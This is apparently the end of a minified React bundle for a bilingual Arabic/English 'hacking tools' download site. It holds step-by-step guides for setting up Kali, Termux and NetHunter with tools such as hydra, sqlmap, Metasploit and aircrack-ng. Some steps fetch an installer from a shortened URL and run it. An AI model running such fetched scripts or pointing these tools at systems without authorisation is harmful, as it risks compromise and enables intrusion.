                    "ذاكرة RAM: 4GB متاحة على الأقل للـ VM",
                    "مساحة قرص: 50GB على الأقل",
                    "معالج يدعم Virtualization (VT-x/AMD-V)",
                ],
                en: [
                    "VirtualBox or VMware (free)",
                    "RAM: At least 4GB available for VM",
                    "Disk space: At least 50GB",
                    "Processor supporting Virtualization (VT-x/AMD-V)",
                ],
            },
            steps: [
                {
                    title: { ar: "تفعيل Virtualization في BIOS", en: "Enable Virtualization in BIOS" },
                    description: { ar: "تأكد من تفعيل VT-x/AMD-V", en: "Make sure VT-x/AMD-V is enabled" },
                    tips: [
                        {
                            ar: "ابحث عن Intel VT-x أو AMD-V أو SVM في إعدادات BIOS",
                            en: "Look for Intel VT-x or AMD-V or SVM in BIOS settings",
                        },
                    ],
                },
                {
                    title: { ar: "تحميل وتثبيت VirtualBox", en: "Download and Install VirtualBox" },
                    description: { ar: "حمّل من الموقع الرسمي", en: "Download from official website" },
                    commands: ["# Windows: حمّل من virtualbox.org", "# Linux: sudo apt install virtualbox"],
                },
                {
                    title: { ar: "تحميل صورة Kali الجاهزة", en: "Download Pre-built Kali Image" },
                    description: {
                        ar: "حمّل ملف .ova أو .vbox من الموقع الرسمي",
                        en: "Download .ova or .vbox file from official site",
                    },
                    tips: [
                        {
                            ar: "الصور الجاهزة أسهل من التثبيت من ISO",
                            en: "Pre-built images are easier than installing from ISO",
                        },
                    ],
                },
                {
                    title: { ar: "استيراد الصورة", en: "Import Image" },
                    description: { ar: "File → Import Appliance", en: "File → Import Appliance" },
                    tips: [
                        { ar: "يمكنك تغيير الإعدادات قبل الاستيراد", en: "You can modify settings before importing" },
                    ],
                },
                {
                    title: { ar: "ضبط الإعدادات", en: "Configure Settings" },
                    description: { ar: "اضبط RAM والمعالج", en: "Adjust RAM and CPU" },
                    tips: [
                        { ar: "خصص 4GB RAM و 2 cores على الأقل", en: "Allocate at least 4GB RAM and 2 cores" },
                        {
                            ar: "فعّل 3D Acceleration للأداء الأفضل",
                            en: "Enable 3D Acceleration for better performance",
                        },
                        { ar: "فعّل Bidirectional clipboard", en: "Enable Bidirectional clipboard" },
                    ],
                },
                {
                    title: { ar: "تشغيل الـ VM", en: "Start VM" },
                    description: { ar: "ابدأ الآلة الافتراضية", en: "Start the virtual machine" },
                    tips: [
                        { ar: "بيانات الدخول الافتراضية: kali/kali", en: "Default credentials: kali/kali" },
                        { ar: "غيّر كلمة المرور فوراً!", en: "Change password immediately!" },
                    ],
                    commands: ["passwd  # لتغيير كلمة المرور"],
                },
                {
                    title: { ar: "تثبيت Guest Additions", en: "Install Guest Additions" },
                    description: { ar: "لتحسين الأداء والتكامل", en: "For better performance and integration" },
                    commands: ["sudo apt update", "sudo apt install -y virtualbox-guest-x11", "sudo reboot"],
                },
            ],
            troubleshooting: [
                {
                    problem: { ar: "خطأ VT-x is disabled", en: "VT-x is disabled error" },
                    solution: {
                        ar: "فعّل Virtualization من إعدادات BIOS",
                        en: "Enable Virtualization in BIOS settings",
                    },
                },
                {
                    problem: { ar: "الشاشة صغيرة جداً", en: "Screen too small" },
                    solution: { ar: "ثبّت Guest Additions وأعد التشغيل", en: "Install Guest Additions and reboot" },
                },
                {
                    problem: { ar: "الأداء بطيء", en: "Performance is slow" },
                    solution: {
                        ar: "زد RAM والـ cores، وفعّل 3D Acceleration",
                        en: "Increase RAM and cores, enable 3D Acceleration",
                    },
                },
            ],
        },
        iphone: {
            title: { ar: "تثبيت أدوات الاختراق على iPhone/iPad", en: "Install Hacking Tools on iPhone/iPad" },
            description: {
                ar: "استخدام iSH Shell لتشغيل بيئة لينكس على iOS بدون Jailbreak",
                en: "Using iSH Shell to run Linux environment on iOS without Jailbreak",
            },
            requirements: {
                ar: ["iPhone/iPad يعمل بـ iOS 11 أو أحدث", "مساحة تخزين 500MB على الأقل", "اتصال إنترنت"],
                en: ["iPhone/iPad running iOS 11 or later", "At least 500MB storage space", "Internet connection"],
            },
            steps: [
                {
                    title: { ar: "تحميل iSH Shell", en: "Download iSH Shell" },
                    description: {
                        ar: "حمّل التطبيق من App Store مجاناً",
                        en: "Download the app from App Store for free",
                    },
                },
                {
                    title: { ar: "فتح التطبيق", en: "Open the App" },
                    description: {
                        ar: "افتح iSH Shell وانتظر التحميل الأولي",
                        en: "Open iSH Shell and wait for initial setup",
                    },
                    tips: [{ ar: "التحميل الأول قد يستغرق دقيقة", en: "First load may take a minute" }],
                },
                {
                    title: { ar: "تحديث الحزم", en: "Update Packages" },
                    description: { ar: "حدّث مدير الحزم", en: "Update package manager" },
                    commands: ["apk update", "apk upgrade"],
                },
                {
                    title: { ar: "تثبيت الأدوات الأساسية", en: "Install Basic Tools" },
                    description: { ar: "ثبّت الأدوات المطلوبة", en: "Install required tools" },
                    commands: [
                        "apk add python3 python3-dev py3-pip",
                        "apk add git curl wget",
                        "apk add nmap openssh",
                        "apk add nano vim",
                    ],
                },
                {
                    title: { ar: "تثبيت مكتبات Python", en: "Install Python Libraries" },
                    description: { ar: "ثبّت المكتبات المفيدة", en: "Install useful libraries" },
                    commands: [
                        "pip3 install requests",
                        "pip3 install beautifulsoup4",
                        "pip3 install paramiko",
                        "pip3 install scapy",
                    ],
                },
                {
                    title: { ar: "استنساخ أدوات من GitHub", en: "Clone Tools from GitHub" },
                    description: { ar: "حمّل أدوات إضافية", en: "Download additional tools" },
                    commands: ["git clone https://github.com/example/tool.git", "cd tool && python3 setup.py install"],
                    tips: [
                        { ar: "ابحث عن أدوات تعمل مع Alpine Linux", en: "Look for tools compatible with Alpine Linux" },
                    ],
                },
            ],
            troubleshooting: [
                {
                    problem: { ar: "التطبيق يتوقف فجأة", en: "App crashes suddenly" },
                    solution: { ar: "أغلق التطبيقات الأخرى لتوفير الذاكرة", en: "Close other apps to free memory" },
                },
                {
                    problem: { ar: "خطأ عند تثبيت حزمة", en: "Error installing package" },
                    solution: { ar: "شغّل apk update ثم حاول مرة أخرى", en: "Run apk update then try again" },
                },
            ],
        },
        termux: {
            title: { ar: "تثبيت أدوات الاختراق على Termux (Android)", en: "Install Hacking Tools on Termux (Android)" },
            description: {
                ar: "تحويل هاتف الأندرويد إلى منصة اختبار اختراق كاملة",
                en: "Turn your Android phone into a full penetration testing platform",
            },
            requirements: {
                ar: [
                    "هاتف Android 7.0 أو أحدث",
                    "مساحة تخزين 2GB على الأقل",
                    "اتصال إنترنت",
                    "تحميل Termux من F-Droid (ليس Play Store!)",
                ],
                en: [
                    "Android 7.0 or later",
                    "At least 2GB storage space",
                    "Internet connection",
                    "Download Termux from F-Droid (not Play Store!)",
                ],
            },
            steps: [
                {
                    title: { ar: "تحميل Termux من F-Droid", en: "Download Termux from F-Droid" },
                    description: {
                        ar: "لا تستخدم Play Store - النسخة قديمة!",
                        en: "Don't use Play Store - version is outdated!",
                    },
                    warnings: [{ ar: "نسخة Play Store لم تعد تعمل!", en: "Play Store version no longer works!" }],
                },
                {
                    title: { ar: "منح الصلاحيات", en: "Grant Permissions" },
                    description: { ar: "السماح بالوصول للتخزين", en: "Allow storage access" },
                    commands: ["termux-setup-storage"],
                    tips: [{ ar: "اضغط Allow عند ظهور الرسالة", en: "Press Allow when prompted" }],
                },
                {
                    title: { ar: "تحديث الحزم", en: "Update Packages" },
                    description: { ar: "حدّث جميع الحزم", en: "Update all packages" },
                    commands: ["pkg update -y", "pkg upgrade -y"],
                },
                {
                    title: { ar: "تثبيت الأساسيات", en: "Install Basics" },
                    description: { ar: "ثبّت الأدوات الأساسية", en: "Install basic tools" },
                    commands: [
                        "pkg install python git curl wget -y",
                        "pkg install nmap hydra sqlmap -y",
                        "pkg install net-tools dnsutils -y",
                        "pkg install openssl openssh -y",
                    ],
                },
                {
                    title: { ar: "تثبيت Metasploit", en: "Install Metasploit" },
                    description: { ar: "إطار عمل اختبار الاختراق", en: "Penetration testing framework" },
                    commands: [
                        "pkg install unstable-repo -y",
                        "pkg install metasploit -y",
                        "msfconsole  # لتشغيل Metasploit",
                    ],
                    tips: [{ ar: "التثبيت قد يستغرق 15-30 دقيقة", en: "Installation may take 15-30 minutes" }],
                },
                {
                    title: { ar: "تثبيت أدوات WiFi", en: "Install WiFi Tools" },
                    description: { ar: "أدوات فحص الشبكات اللاسلكية", en: "Wireless network scanning tools" },
                    commands: ["pkg install aircrack-ng -y", "pkg install wifite2 -y"],
                    warnings: [{ ar: "بعض الميزات تحتاج Root!", en: "Some features require Root!" }],
                },
                {
                    title: { ar: "تثبيت أدوات الويب", en: "Install Web Tools" },
                    description: { ar: "أدوات اختبار تطبيقات الويب", en: "Web application testing tools" },
                    commands: [
                        "pip install sqlmap",
                        "pip install dirsearch",
                        "git clone https://github.com/maurosoria/dirsearch.git",
                    ],
                },
                {
                    title: { ar: "تثبيت مكتبات Python", en: "Install Python Libraries" },
                    description: { ar: "مكتبات مفيدة للبرمجة", en: "Useful programming libraries" },
                    commands: [
                        "pip install requests beautifulsoup4",
                        "pip install paramiko scapy",
                        "pip install pwntools",
                    ],
                },
                {
                    title: { ar: "إنشاء اختصارات", en: "Create Shortcuts" },
                    description: { ar: "اختصارات للأوامر المتكررة", en: "Shortcuts for common commands" },
                    commands: [
                        `echo 'alias update="pkg update && pkg upgrade"' >> ~/.bashrc`,
                        `echo 'alias msf="msfconsole"' >> ~/.bashrc`,
                        "source ~/.bashrc",
                    ],
                },
                {
                    title: { ar: "تثبيت Kali NetHunter (اختياري)", en: "Install Kali NetHunter (Optional)" },
                    description: { ar: "تثبيت بيئة كالي كاملة", en: "Install full Kali environment" },
                    commands: [
                        "pkg install wget -y",
                        "wget -O install-nethunter-termux https://offs.ec/2MceZWr",
                        "chmod +x install-nethunter-termux",
                        "./install-nethunter-termux",
                    ],
                    tips: [{ ar: "يحتاج مساحة كبيرة (~4GB)", en: "Requires large space (~4GB)" }],
                },
            ],
            troubleshooting: [
                {
                    problem: { ar: "خطأ: Unable to locate package", en: "Error: Unable to locate package" },
                    solution: { ar: "شغّل pkg update ثم حاول مرة أخرى", en: "Run pkg update then try again" },
                },
                {
                    problem: { ar: "Termux لا يعمل بعد التحديث", en: "Termux not working after update" },
                    solution: { ar: "احذف التطبيق وحمّله من F-Droid", en: "Uninstall and download from F-Droid" },
                },
                {
                    problem: { ar: "خطأ في الصلاحيات", en: "Permission error" },
                    solution: { ar: "شغّل termux-setup-storage", en: "Run termux-setup-storage" },
                },
                {
                    problem: { ar: "الأدوات لا تعمل كما يجب", en: "Tools not working properly" },
                    solution: {
                        ar: "بعض الأدوات تحتاج Root - استخدم NetHunter Rootless",
                        en: "Some tools need Root - use NetHunter Rootless",
                    },
                },
            ],
        },
        nethunter: {
            title: { ar: "تثبيت Kali NetHunter على Android", en: "Install Kali NetHunter on Android" },
            description: {
                ar: "منصة كالي لينكس المحمولة للهواتف الذكية مع دعم كامل لأدوات الاختراق",
                en: "Mobile Kali Linux platform for smartphones with full hacking tools support",
            },
            requirements: {
                ar: [
                    "هاتف Android 7.0 أو أحدث",
                    "مساحة تخزين 4GB على الأقل",
                    "Termux من F-Droid",
                    "Root (للنسخة الكاملة - اختياري)",
                ],
                en: [
                    "Android 7.0 or later",
                    "At least 4GB storage space",
                    "Termux from F-Droid",
                    "Root (for full version - optional)",
                ],
            },
            steps: [
                {
                    title: { ar: "تثبيت NetHunter Rootless", en: "Install NetHunter Rootless" },
                    description: { ar: "النسخة التي تعمل بدون Root", en: "Version that works without Root" },
                    commands: [
                        "pkg install wget -y",
                        "wget -O install-nethunter-termux https://offs.ec/2MceZWr",
                        "chmod +x install-nethunter-termux",
                        "./install-nethunter-termux",
                    ],
                    tips: [
                        { ar: "اختر الحجم المناسب: minimal أو full", en: "Choose appropriate size: minimal or full" },
                    ],
                },
                {
                    title: { ar: "تشغيل NetHunter", en: "Start NetHunter" },
                    description: { ar: "ابدأ بيئة كالي", en: "Start Kali environment" },
                    commands: ["nethunter", "# أو للواجهة الرسومية:", "nethunter kex &"],
                },
                {
                    title: { ar: "الاتصال بالواجهة الرسومية", en: "Connect to GUI" },
                    description: { ar: "استخدم VNC للوصول لسطح المكتب", en: "Use VNC to access desktop" },
                    commands: [
                        "# ثبّت NetHunter KeX من Play Store",
                        "# أو استخدم أي VNC client",
                        "# Server: localhost:1",
                        "# Password: changeme",
                    ],
                },
                {
                    title: { ar: "تحديث الأدوات", en: "Update Tools" },
                    description: { ar: "حدّث جميع الأدوات", en: "Update all tools" },
                    commands: ["nethunter", "sudo apt update && sudo apt upgrade -y"],
                },
            ],
            troubleshooting: [
                {
                    problem: { ar: "خطأ عند التثبيت", en: "Installation error" },
                    solution: { ar: "تأكد من تحديث Termux أولاً", en: "Make sure Termux is updated first" },
                },
                {
                    problem: { ar: "الواجهة الرسومية لا تعمل", en: "GUI not working" },
                    solution: {
                        ar: "شغّل nethunter kex passwd لتعيين كلمة مرور",
                        en: "Run nethunter kex passwd to set password",
                    },
                },
            ],
        },
    },
    bk = () => {
        const [e, t] = x.useState("desktop"),
            [n, r] = x.useState("ar"),
            o = {
                title: n === "ar" ? "تنزيل أدوات الاختراق" : "Download Hacking Tools",
                subtitle:
                    n === "ar"
                        ? "روابط تنزيل مع شرح       "
                        : "Download links with explanation",
                desktopSection: n === "ar" ? "للكمبيوتر (Installer)" : "For PC (Installer)",
                liveSection: "Live Boot (USB)",
                vmSection: "Virtual Machines",
                armSection: n === "ar" ? "أجهزة ARM" : "ARM Devices",
                mobileSection: n === "ar" ? "للهواتف" : "For Mobile",
                termuxSection: "Termux (Android)",
                installGuides: n === "ar" ? "دليل التثبيت الشامل" : "Complete Installation Guides",
                requirements: n === "ar" ? "المتطلبات" : "Requirements",
                steps: n === "ar" ? "الخطوات" : "Steps",
                troubleshooting: n === "ar" ? "حل المشاكل" : "Troubleshooting",
                problem: n === "ar" ? "المشكلة" : "Problem",
                solution: n === "ar" ? "الحل" : "Solution",
                tip: n === "ar" ? "نصيحة" : "Tip",
                warning: n === "ar" ? "تحذير" : "Warning",
            },
            i = (m, f, S) =>
                l.jsxs("div", {
                    className: "mb-12",
                    children: [
                        l.jsxs("h2", {
                            className: "text-2xl font-bold text-primary mb-6 flex items-center gap-3",
                            children: [R.createElement(f, { className: "w-6 h-6" }), m],
                        }),
                        l.jsx("div", {
                            className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4",
                            children: S.map((y, w) =>
                                l.jsx(
                                    "a",
                                    {
                                        href: y.link,
                                        target: "_blank",
                                        rel: "noopener noreferrer",
                                        className: "cyber-card p-5 group hover:border-primary/50 transition-all",
                                        children: l.jsxs("div", {
                                            className: "flex items-start gap-4",
                                            children: [
                                                l.jsx("div", {
                                                    className:
                                                        "w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center group-hover:box-glow-sm transition-all flex-shrink-0",
                                                    children: l.jsx(y.icon, { className: "w-6 h-6 text-primary" }),
                                                }),
                                                l.jsxs("div", {
                                                    className: "flex-1 min-w-0",
                                                    children: [
                                                        l.jsx("h3", {
                                                            className: "text-lg font-bold text-primary mb-1 truncate",
                                                            children: n === "ar" ? y.name.ar : y.name.en,
                                                        }),
                                                        l.jsx("p", {
                                                            className:
                                                                "text-muted-foreground text-sm mb-2 line-clamp-2",
                                                            children: n === "ar" ? y.description.ar : y.description.en,
                                                        }),
                                                        l.jsxs("div", {
                                                            className:
                                                                "flex items-center gap-2 text-muted-foreground text-xs",
                                                            children: [
                                                                l.jsx("span", {
                                                                    className: "bg-secondary px-2 py-0.5 rounded",
                                                                    children: y.size,
                                                                }),
                                                                l.jsx(px, { className: "w-3 h-3" }),
                                                            ],
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        }),
                                    },
                                    w
                                )
                            ),
                        }),
                    ],
                }),
            s = Br.filter((m) => m.category === "desktop"),
            a = Br.filter((m) => m.category === "live"),
            c = Br.filter((m) => m.category === "vm"),
            u = Br.filter((m) => m.category === "arm"),
            d = Br.filter((m) => m.category === "mobile"),
            p = Br.filter((m) => m.category === "termux");
        return l.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                l.jsx(Or, {}),
                l.jsx("main", {
                    className: "pt-24 pb-16",
                    children: l.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            l.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    l.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: l.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: l.jsx(sa, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    l.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            l.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: o.title,
                                            }),
                                            l.jsx("button", {
                                                onClick: () => r((m) => (m === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: l.jsx(zi, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    l.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: o.subtitle,
                                    }),
                                ],
                            }),
                            l.jsxs("div", {
                                className: "max-w-6xl mx-auto",
                                children: [
                                    i(o.desktopSection, si, s),
                                    i(o.liveSection, bg, a),
                                    i(o.vmSection, Wu, c),
                                    i(o.armSection, ia, u),
                                    i(o.mobileSection, Ku, d),
                                    i(o.termuxSection, Ar, p),
                                ],
                            }),
                            l.jsxs("div", {
                                className: "max-w-5xl mx-auto mt-16",
                                children: [
                                    l.jsx("h2", {
                                        className: "text-3xl font-bold text-primary mb-8 text-center",
                                        children: o.installGuides,
                                    }),
                                    l.jsx("div", {
                                        className: "space-y-4",
                                        children: Object.entries(Sk).map(([m, f]) =>
                                            l.jsxs(
                                                "div",
                                                {
                                                    className: "cyber-card overflow-hidden",
                                                    children: [
                                                        l.jsxs("button", {
                                                            onClick: () => t(e === m ? null : m),
                                                            className:
                                                                "w-full p-5 flex items-center justify-between hover:bg-primary/5 transition-colors",
                                                            children: [
                                                                l.jsxs("div", {
                                                                    className: "text-left",
                                                                    children: [
                                                                        l.jsx("h3", {
                                                                            className: "text-xl font-bold text-primary",
                                                                            children:
                                                                                n === "ar" ? f.title.ar : f.title.en,
                                                                        }),
                                                                        l.jsx("p", {
                                                                            className:
                                                                                "text-sm text-muted-foreground mt-1",
                                                                            children:
                                                                                n === "ar"
                                                                                    ? f.description.ar
                                                                                    : f.description.en,
                                                                        }),
                                                                    ],
                                                                }),
                                                                e === m
                                                                    ? l.jsx(oa, {
                                                                          className:
                                                                              "w-6 h-6 text-primary flex-shrink-0",
                                                                      })
                                                                    : l.jsx(ra, {
                                                                          className:
                                                                              "w-6 h-6 text-muted-foreground flex-shrink-0",
                                                                      }),
                                                            ],
                                                        }),
                                                        e === m &&
                                                            l.jsxs("div", {
                                                                className:
                                                                    "border-t border-border/30 p-6 animate-fade-in space-y-8",
                                                                children: [
                                                                    l.jsxs("div", {
                                                                        children: [
                                                                            l.jsxs("h4", {
                                                                                className:
                                                                                    "text-lg font-bold text-primary mb-4 flex items-center gap-2",
                                                                                children: [
                                                                                    l.jsx(Nx, { className: "w-5 h-5" }),
                                                                                    o.requirements,
                                                                                ],
                                                                            }),
                                                                            l.jsx("ul", {
                                                                                className:
                                                                                    "grid grid-cols-1 md:grid-cols-2 gap-2",
                                                                                children: (n === "ar"
                                                                                    ? f.requirements.ar
                                                                                    : f.requirements.en
                                                                                ).map((S, y) =>
                                                                                    l.jsxs(
                                                                                        "li",
                                                                                        {
                                                                                            className:
                                                                                                "flex items-start gap-2 text-muted-foreground text-sm",
                                                                                            children: [
                                                                                                l.jsx(Ac, {
                                                                                                    className:
                                                                                                        "w-4 h-4 text-primary mt-0.5 flex-shrink-0",
                                                                                                }),
                                                                                                S,
                                                                                            ],
                                                                                        },
                                                                                        y
                                                                                    )
                                                                                ),
                                                                            }),
                                                                        ],
                                                                    }),
                                                                    l.jsxs("div", {
                                                                        children: [
                                                                            l.jsxs("h4", {
                                                                                className:
                                                                                    "text-lg font-bold text-primary mb-4 flex items-center gap-2",
                                                                                children: [
                                                                                    l.jsx(Cx, { className: "w-5 h-5" }),
                                                                                    o.steps,
                                                                                ],
                                                                            }),
                                                                            l.jsx("div", {
                                                                                className: "space-y-6",
                                                                                children: f.steps.map((S, y) =>
                                                                                    l.jsxs(
                                                                                        "div",
                                                                                        {
                                                                                            className: "flex gap-4",
                                                                                            children: [
                                                                                                l.jsx("span", {
                                                                                                    className:
                                                                                                        "w-10 h-10 rounded-xl bg-primary/20 text-primary flex items-center justify-center font-bold flex-shrink-0",
                                                                                                    children: y + 1,
                                                                                                }),
                                                                                                l.jsxs("div", {
                                                                                                    className:
                                                                                                        "flex-1 space-y-3",
                                                                                                    children: [
                                                                                                        l.jsxs("div", {
                                                                                                            children: [
                                                                                                                l.jsx(
                                                                                                                    "h5",
                                                                                                                    {
                                                                                                                        className:
                                                                                                                            "font-bold text-foreground",
                                                                                                                        children:
                                                                                                                            n ===
                                                                                                                            "ar"
                                                                                                                                ? S
                                                                                                                                      .title
                                                                                                                                      .ar
                                                                                                                                : S
                                                                                                                                      .title
                                                                                                                                      .en,
                                                                                                                    }
                                                                                                                ),
                                                                                                                l.jsx(
                                                                                                                    "p",
                                                                                                                    {
                                                                                                                        className:
                                                                                                                            "text-muted-foreground text-sm",
                                                                                                                        children:
                                                                                                                            n ===
                                                                                                                            "ar"
                                                                                                                                ? S
                                                                                                                                      .description
                                                                                                                                      .ar
                                                                                                                                : S
                                                                                                                                      .description
                                                                                                                                      .en,
                                                                                                                    }
                                                                                                                ),
                                                                                                            ],
                                                                                                        }),
                                                                                                        S.commands &&
                                                                                                            S.commands
                                                                                                                .length >
                                                                                                                0 &&
                                                                                                            l.jsx(
                                                                                                                "div",
                                                                                                                {
                                                                                                                    className:
                                                                                                                        "bg-background rounded-lg p-3 border border-border/50",
                                                                                                                    children:
                                                                                                                        l.jsx(
                                                                                                                            "code",
                                                                                                                            {
                                                                                                                                className:
                                                                                                                                    "text-sm text-primary font-mono whitespace-pre-wrap",
                                                                                                                                children:
                                                                                                                                    S
                                                                                                                                        .commands
                                                                                                                                        .join(`
`),
                                                                                                                            }
                                                                                                                        ),
                                                                                                                }
                                                                                                            ),
                                                                                                        S.tips &&
                                                                                                            S.tips
                                                                                                                .length >
                                                                                                                0 &&
                                                                                                            l.jsx(
                                                                                                                "div",
                                                                                                                {
                                                                                                                    className:
                                                                                                                        "space-y-2",
                                                                                                                    children:
                                                                                                                        S.tips.map(
                                                                                                                            (
                                                                                                                                w,
                                                                                                                                g
                                                                                                                            ) =>
                                                                                                                                l.jsxs(
                                                                                                                                    "div",
                                                                                                                                    {
                                                                                                                                        className:
                                                                                                                                            "flex items-start gap-2 text-sm p-2 rounded-lg bg-primary/5 border border-primary/20",
                                                                                                                                        children:
                                                                                                                                            [
                                                                                                                                                l.jsx(
                                                                                                                                                    vx,
                                                                                                                                                    {
                                                                                                                                                        className:
                                                                                                                                                            "w-4 h-4 text-primary mt-0.5 flex-shrink-0",
                                                                                                                                                    }
                                                                                                                                                ),
                                                                                                                                                l.jsx(
                                                                                                                                                    "span",
                                                                                                                                                    {
                                                                                                                                                        className:
                                                                                                                                                            "text-muted-foreground",
                                                                                                                                                        children:
                                                                                                                                                            n ===
                                                                                                                                                            "ar"
                                                                                                                                                                ? w.ar
                                                                                                                                                                : w.en,
                                                                                                                                                    }
                                                                                                                                                ),
                                                                                                                                            ],
                                                                                                                                    },
                                                                                                                                    g
                                                                                                                                )
                                                                                                                        ),
                                                                                                                }
                                                                                                            ),
                                                                                                        S.warnings &&
                                                                                                            S.warnings
                                                                                                                .length >
                                                                                                                0 &&
                                                                                                            l.jsx(
                                                                                                                "div",
                                                                                                                {
                                                                                                                    className:
                                                                                                                        "space-y-2",
                                                                                                                    children:
                                                                                                                        S.warnings.map(
                                                                                                                            (
                                                                                                                                w,
                                                                                                                                g
                                                                                                                            ) =>
                                                                                                                                l.jsxs(
                                                                                                                                    "div",
                                                                                                                                    {
                                                                                                                                        className:
                                                                                                                                            "flex items-start gap-2 text-sm p-2 rounded-lg bg-destructive/10 border border-destructive/30",
                                                                                                                                        children:
                                                                                                                                            [
                                                                                                                                                l.jsx(
                                                                                                                                                    Tp,
                                                                                                                                                    {
                                                                                                                                                        className:
                                                                                                                                                            "w-4 h-4 text-destructive mt-0.5 flex-shrink-0",
                                                                                                                                                    }
                                                                                                                                                ),
                                                                                                                                                l.jsx(
                                                                                                                                                    "span",
                                                                                                                                                    {
                                                                                                                                                        className:
                                                                                                                                                            "text-destructive",
                                                                                                                                                        children:
                                                                                                                                                            n ===
                                                                                                                                                            "ar"
                                                                                                                                                                ? w.ar
                                                                                                                                                                : w.en,
                                                                                                                                                    }
                                                                                                                                                ),
                                                                                                                                            ],
                                                                                                                                    },
                                                                                                                                    g
                                                                                                                                )
                                                                                                                        ),
                                                                                                                }
                                                                                                            ),
                                                                                                    ],
                                                                                                }),
                                                                                            ],
                                                                                        },
                                                                                        y
                                                                                    )
                                                                                ),
                                                                            }),
                                                                        ],
                                                                    }),
                                                                    f.troubleshooting.length > 0 &&
                                                                        l.jsxs("div", {
                                                                            children: [
                                                                                l.jsxs("h4", {
                                                                                    className:
                                                                                        "text-lg font-bold text-primary mb-4 flex items-center gap-2",
                                                                                    children: [
                                                                                        l.jsx(Cg, {
                                                                                            className: "w-5 h-5",
                                                                                        }),
                                                                                        o.troubleshooting,
                                                                                    ],
                                                                                }),
                                                                                l.jsx("div", {
                                                                                    className: "space-y-3",
                                                                                    children: f.troubleshooting.map(
                                                                                        (S, y) =>
                                                                                            l.jsxs(
                                                                                                "div",
                                                                                                {
                                                                                                    className:
                                                                                                        "p-4 rounded-lg bg-secondary border border-border/50",
                                                                                                    children: [
                                                                                                        l.jsxs("div", {
                                                                                                            className:
                                                                                                                "flex items-start gap-2 mb-2",
                                                                                                            children: [
                                                                                                                l.jsx(
                                                                                                                    Tp,
                                                                                                                    {
                                                                                                                        className:
                                                                                                                            "w-4 h-4 text-yellow-500 mt-0.5 flex-shrink-0",
                                                                                                                    }
                                                                                                                ),
                                                                                                                l.jsx(
                                                                                                                    "span",
                                                                                                                    {
                                                                                                                        className:
                                                                                                                            "font-medium text-foreground",
                                                                                                                        children:
                                                                                                                            n ===
                                                                                                                            "ar"
                                                                                                                                ? S
                                                                                                                                      .problem
                                                                                                                                      .ar
                                                                                                                                : S
                                                                                                                                      .problem
                                                                                                                                      .en,
                                                                                                                    }
                                                                                                                ),
                                                                                                            ],
                                                                                                        }),
                                                                                                        l.jsxs("div", {
                                                                                                            className:
                                                                                                                "flex items-start gap-2 mr-6",
                                                                                                            children: [
                                                                                                                l.jsx(
                                                                                                                    Ac,
                                                                                                                    {
                                                                                                                        className:
                                                                                                                            "w-4 h-4 text-primary mt-0.5 flex-shrink-0",
                                                                                                                    }
                                                                                                                ),
                                                                                                                l.jsx(
                                                                                                                    "span",
                                                                                                                    {
                                                                                                                        className:
                                                                                                                            "text-muted-foreground text-sm",
                                                                                                                        children:
                                                                                                                            n ===
                                                                                                                            "ar"
                                                                                                                                ? S
                                                                                                                                      .solution
                                                                                                                                      .ar
                                                                                                                                : S
                                                                                                                                      .solution
                                                                                                                                      .en,
                                                                                                                    }
                                                                                                                ),
                                                                                                            ],
                                                                                                        }),
                                                                                                    ],
                                                                                                },
                                                                                                y
                                                                                            )
                                                                                    ),
                                                                                }),
                                                                            ],
                                                                        }),
                                                                ],
                                                            }),
                                                    ],
                                                },
                                                m
                                            )
                                        ),
                                    }),
                                ],
                            }),
                        ],
                    }),
                }),
                l.jsx(_r, {}),
            ],
        });
    },
    kk = () => {
        const e = Io();
        return (
            x.useEffect(() => {
                console.error("404 Error: User attempted to access non-existent route:", e.pathname);
            }, [e.pathname]),
            l.jsx("div", {
                className: "flex min-h-screen items-center justify-center bg-muted",
                children: l.jsxs("div", {
                    className: "text-center",
                    children: [
                        l.jsx("h1", { className: "mb-4 text-4xl font-bold", children: "404" }),
                        l.jsx("p", {
                            className: "mb-4 text-xl text-muted-foreground",
                            children: "Oops! Page not found",
                        }),
                        l.jsx("a", {
                            href: "/",
                            className: "text-primary underline hover:text-primary/90",
                            children: "Return to Home",
                        }),
                    ],
                }),
            })
        );
    },
    Ck = new nb(),
    Pk = () =>
        l.jsx(ob, {
            client: Ck,
            children: l.jsx(ik, {
                children: l.jsxs(MS, {
                    children: [
                        l.jsx(hw, {}),
                        l.jsx(Gw, {}),
                        l.jsx(tk, {
                            children: l.jsxs(Qb, {
                                children: [
                                    l.jsx(sn, { path: "/", element: l.jsx(dk, {}) }),
                                    l.jsx(sn, { path: "/ai", element: l.jsx(fk, {}) }),
                                    l.jsx(sn, { path: "/tools", element: l.jsx(hk, {}) }),
                                    l.jsx(sn, { path: "/cc", element: l.jsx(vk, {}) }),
                                    l.jsx(sn, { path: "/scripts", element: l.jsx(xk, {}) }),
                                    l.jsx(sn, { path: "/guide", element: l.jsx(wk, {}) }),
                                    l.jsx(sn, { path: "/download", element: l.jsx(bk, {}) }),
                                    l.jsx(sn, { path: "*", element: l.jsx(kk, {}) }),
                                ],
                            }),
                        }),
                    ],
                }),
            }),
        });
Dh(document.getElementById("root")).render(l.jsx(Pk, {}));
